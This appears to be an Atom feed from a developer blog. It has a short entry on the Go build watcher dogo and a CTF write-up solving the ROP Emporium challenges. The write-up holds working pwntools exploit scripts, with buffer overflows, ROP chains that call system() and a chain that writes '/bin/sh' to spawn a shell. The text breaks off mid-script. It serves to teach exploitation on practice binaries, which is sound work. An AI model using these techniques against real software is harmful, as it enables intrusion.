<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HeliantHuS&#39;s Blog</title>
  
  <subtitle>Python/Go Developer</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://helianthus.top/"/>
  <updated>2020-05-30T09:25:01.929Z</updated>
  <id>https://helianthus.top/</id>
  
  <author>
    <name>HeliantHuS</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dogo目录监听自动构建工具</title>
    <link href="https://helianthus.top/2020/05/31/15-golang-dogo-filelisten/"/>
    <id>https://helianthus.top/2020/05/31/15-golang-dogo-filelisten/</id>
    <published>2020-05-30T17:00:50.000Z</published>
    <updated>2020-05-30T09:25:01.929Z</updated>
    
    <content type="html"><![CDATA[<p><code>dogo</code>是一个使用<code>Go</code>语言编写的自动化构建工具, 可以实时监听目录, 发生更改时就自动执行特定命令。</p><p>Github: <a href="https://github.com/liudng/dogo" target="_blank" rel="noopener">https://github.com/liudng/dogo</a></p><a id="more"></a><h2 id="下载并编译"><a href="#下载并编译" class="headerlink" title="下载并编译"></a>下载并编译</h2><pre class=" language-shell"><code class="language-shell">git clone https://github.com/liudng/dogo.gitcd dogogo mod init dogogo build</code></pre><p>我使用的是<code>windows</code>系统, 执行完上面的命令之后会生成一个<code>dogo.exe</code>.</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>目前有个需求<br>我的工作(源码)目录: <code>C:\\Users\\Administrator\\Desktop\\testSource</code><br>需要监听的文件类型: <code>.go</code><br>监听到更改需要执行的命令: <code>go build -o main.exe</code><br>并且<code>build</code>出来之后还要执行这个<code>main.exe</code>  </p><p>配置文件就可以这样写:</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"WorkingDir"</span><span class="token operator">:</span> <span class="token string">"C:\\Users\\Administrator\\Desktop\\testSource"</span><span class="token punctuation">,</span>  <span class="token property">"SourceDir"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"C:\\Users\\Administrator\\Desktop\\testSource"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"SourceExt"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">".go"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"BuildCmd"</span><span class="token operator">:</span> <span class="token string">"go build -o main.exe"</span><span class="token punctuation">,</span>  <span class="token property">"RunCmd"</span><span class="token operator">:</span> <span class="token string">"main.exe"</span><span class="token punctuation">,</span>  <span class="token property">"Decreasing"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span></code></pre><h2 id="看看效果"><a href="#看看效果" class="headerlink" title="看看效果?"></a>看看效果?</h2><p><img src="/images/15/1.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;dogo&lt;/code&gt;是一个使用&lt;code&gt;Go&lt;/code&gt;语言编写的自动化构建工具, 可以实时监听目录, 发生更改时就自动执行特定命令。&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&quot;https://github.com/liudng/dogo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/liudng/dogo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="https://helianthus.top/categories/Tools/"/>
    
    
      <category term="golang" scheme="https://helianthus.top/tags/golang/"/>
    
      <category term="watch" scheme="https://helianthus.top/tags/watch/"/>
    
      <category term="dogo" scheme="https://helianthus.top/tags/dogo/"/>
    
  </entry>
  
  <entry>
    <title>【CTF-PWN】ROPEmporium</title>
    <link href="https://helianthus.top/2020/05/28/14-CTF-PWN-ROPEmporiumWriteUP/"/>
    <id>https://helianthus.top/2020/05/28/14-CTF-PWN-ROPEmporiumWriteUP/</id>
    <published>2020-05-28T09:17:06.000Z</published>
    <updated>2020-05-29T01:33:32.204Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下学习ROP的基础题目.</p><a id="more"></a><hr><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h5 id="32位"><a href="#32位" class="headerlink" title=" 32位:"></a><a href="https://ropemporium.com/binary/ret2win32.zip" target="_blank" rel="noopener"> 32位</a>:</h5><p>先分析一下程序, 可以看到<code>main</code>、<code>pwnme</code>、<code>ret2win</code>函数.<br><code>main</code>函数调用了<code>pwnme</code>函数, <code>pwnme</code>函数里面存在一个<code>gets</code>读取<code>0x32</code>个字节到<code>s</code>变量里面, 但是这个变量只有<code>0x28</code>大小. 也就是<code>0x28</code> + <code>4</code> + <code>retaddr</code>就可以控制这个程序的返回地址了.<br><img src="/images/14/ret2win/1.jpg" alt></p><p>废话不多说 直接上exp.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>ret2win_addr <span class="token operator">=</span> <span class="token number">0x08048659</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/ret2win/2.jpg" alt></p><h5 id="64位"><a href="#64位" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/ret2win.zip" target="_blank" rel="noopener">64位</a>:</h5><p>虽然是<code>64</code>位的, 但是这个题目不需要进行<code>rop</code>, 所以和<code>32</code>位的做法一样.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2win"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>   <span class="token comment" spellcheck="true"># because is 64 bit program, +8</span>ret2win_addr <span class="token operator">=</span> <span class="token number">0x0000000000400811</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret2win_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/ret2win/3.jpg" alt></p><hr><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/split32.zip" target="_blank" rel="noopener">32位</a>:</h5><p><code>main</code>、<code>pwnme</code>函数都和上道题差不多, 但是<code>usefulFunction</code>里面只有一条<code>system(&quot;/bin/ls&quot;)</code>, 并不是<code>cat /flag</code>, 不过可以通过<code>IDA</code>里面<code>shift+F12</code>, 搜索到<code>/bin/cat flag.txt</code>, 也就是<code>system</code>函数和<code>/bin/cat flag.txt</code>并不在连续的内存位置, 所以需要构造一下 :D<br><img src="/images/14/split/1.jpg" alt></p><p>接下来就要用到汇编中, 调用函数的原理. 如果不懂的可以看我之前拍过的一期视频.<br><a href="https://www.bilibili.com/video/BV1DE411y7nR" target="_blank" rel="noopener">【x86汇编】详解汇编调用函数三步，加恢复堆栈平衡</a></p><p>开始写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./split32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./split32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>cat_flag_addr <span class="token operator">=</span> <span class="token number">0x0804A030</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>cat_flag_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/split/2.jpg" alt></p><h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/split.zip" target="_blank" rel="noopener">64位</a>:</h5><p>64位调用函数参数寄存器: <code>rdi, rsi, rdx, rcx, r8, r9</code><br>从这里开始, 我们第一次接触<code>gadget</code>, 什么是<code>gadget</code>呢, 就是程序中存在的一些小汇编指令,<br>比如<code>pop rdi; ret</code>, <code>pop rsi; ret</code>, <code>mov r12, 13; ret</code>, 有没有发现什么规律, 每个汇编指令结尾都是<code>ret</code>, 所以是<code>ROP</code> <code>Return-Oriented Programming</code>, 可以通过找到多个<code>gadget</code>, 最后组成一段长的<code>链</code>, 以完成我们的攻击.</p><p>在我们安装完毕<code>pwntools</code>之后, 会有一个工具<code>ROPgadget</code>, 它可以很方便的找到我们攻击所需要的<code>gadget</code>.</p><p>64位程序调用函数的时候, 函数的前6个参数是存在于寄存器当中的, 所以我们需要把<code>/bin/cat flag.txt</code>放到第一个参数的位置, 也就是需要找到<code>pop rdi; ret</code></p><p>找<code>pop rdi; ret</code></p><pre class=" language-shell"><code class="language-shell">ROPgadget --binary split --only "pop|ret"</code></pre><p>可以找到<code>0x0000000000400883 : pop rdi ; ret</code>, 已经可以开始写exp了.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./split"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var </span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400883</span>cat_flag_addr <span class="token operator">=</span> <span class="token number">0x0000000000601060</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cat_flag_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/split/3.jpg" alt></p><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/callme32.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这道题目是为了加深函数调用的理解<br>题目说需要依次调用<code>callme_one(), callme_two() , callme_three()</code>三个函数, 每个函数都需要传递<code>1 2 3</code>三个参数. 也就是<code>func(1, 2, 3)</code></p><p>需要通过<code>ROPgadget</code>找到一个可以删除栈上三个参数的<code>gadget</code>, 以恢复栈平衡.</p><p>要注意, <code>callme_one, callme_two</code>等函数地址要取<code>函数本身</code>的, 而不是<code>call callme_one</code>之类的地址.</p><p>开始写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./callme32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./callme32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>callme_one_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_one"</span><span class="token punctuation">]</span>callme_two_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_two"</span><span class="token punctuation">]</span>callme_three_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_three"</span><span class="token punctuation">]</span>pop_esi_rdi_rbp_ret <span class="token operator">=</span> <span class="token number">0x080488a9</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_one_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_two_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>callme_three_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_esi_rdi_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/callme/1.jpg" alt></p><h5 id="64位-2"><a href="#64位-2" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/callme.zip" target="_blank" rel="noopener">64位</a>:</h5><p>emm, 这个题目, 64位个人感觉要更简单一些, 专心找<code>gadget</code>就可以了.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./callme"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./callme"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>callme_one_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_one"</span><span class="token punctuation">]</span>callme_two_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_two"</span><span class="token punctuation">]</span>callme_three_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"callme_three"</span><span class="token punctuation">]</span>pop_rdi_rsi_rdx_addr <span class="token operator">=</span> <span class="token number">0x0000000000401ab0</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_one_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_two_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_three_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/callme/2.jpg" alt></p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h5 id="32位-3"><a href="#32位-3" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/write432.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这个挑战给了<code>system</code>但是没有给<code>/bin/cat flag.txt</code>, 则需要自己写一段进去, 这里打算直接写个<code>/bin/sh</code>, 但是往哪里写呢？</p><p>通过<code>readelf</code>工具查看段.<br><img src="/images/14/write4/1.jpg" alt></p><p>可以看到<code>.data</code>和<code>.bss</code>段都有可读写的权限, 这里就可以把<code>/bin/sh</code>写到<code>.data</code>段内, 要写入的长度是7, data段大小是8, 刚好可以装下.</p><p>要想写入数据到里面, 需要使用<code>mov</code>指令, 于是找到了</p><pre><code>0x080486da : pop edi ; pop ebp ; ret0x08048670 : mov dword ptr [edi], ebp ; ret</code></pre><p>这两条指令就可以满足我们写入数据到内存的想法.  由于这是32位的程序, 每次只能写入4个字节, 而<code>/bin/sh</code>是7个字节, 于是我们要分两次进行写入。 </p><p>那? Go?</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>data_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span>pop_edi_ebp_addr <span class="token operator">=</span> <span class="token number">0x080486da</span>mov_edi_ebp <span class="token operator">=</span> <span class="token number">0x08048670</span>bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>left_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>right_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> left_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> right_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/write4/2.jpg" alt></p><h5 id="64位-3"><a href="#64位-3" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/write4.zip" target="_blank" rel="noopener">64位</a>:</h5><p>思路和32位一样, 不过64位要更简单一些, 因为可以一次性直接把<code>/bin/sh</code>写进去, 不用分开写入了.</p><p>找到需要的<code>gadget</code></p><pre><code>0x0000000000400893 : pop rdi ; ret0x0000000000400890 : pop r14 ; pop r15 ; ret0x0000000000400820 : mov qword ptr [r14], r15 ; ret</code></pre><p>开始编写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400893</span>data_addr <span class="token operator">=</span> <span class="token number">0x0000000000601050</span>mov_r14_r15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400820</span>pop_r14_15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_15_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh_str <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_r14_r15_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/write4/3.jpg" alt></p><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h5 id="32位-4"><a href="#32位-4" class="headerlink" title="32位:"></a><a href>32位</a>:</h5><p>程序禁止输入<code>b i c / &lt;space&gt; f n s</code>, 可以通过异或后的结果来把<code>/bin/sh</code>写到程序, 再通过<code>gadget</code>把<code>/bin/sh</code>异或回来, 再进行执行.</p><p>首先要得出异或哪个数字可以通过这个黑名单, 写个脚本跑跑.</p><pre class=" language-python"><code class="language-python">blackList <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">,</span>  <span class="token string">"s"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 测试从1异或到20 看看哪个数字可以使用</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> bin_sh<span class="token punctuation">:</span>        <span class="token keyword">if</span> ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> i <span class="token keyword">in</span> blackList<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> item            <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">""</span></code></pre><p>执行完毕可以发现<code>2 3 5 9 18 19</code>之类的都可以用, 然后直接用个最小的就可以.</p><p>开始编写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>overflow <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"laaa"</span><span class="token punctuation">)</span>xor_num <span class="token operator">=</span> <span class="token number">2</span>bin_sh <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_addr <span class="token operator">=</span> <span class="token number">0x0804a038</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>mov_edi_esi_ret <span class="token operator">=</span> <span class="token number">0x08048893</span>pop_esi_edi_ret <span class="token operator">=</span> <span class="token number">0x08048899</span>pop_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048896</span>xor_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048890</span><span class="token comment" spellcheck="true"># xor encode</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">:</span>    bin_sh<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow<span class="token comment" spellcheck="true"># write "/bin" to data</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span 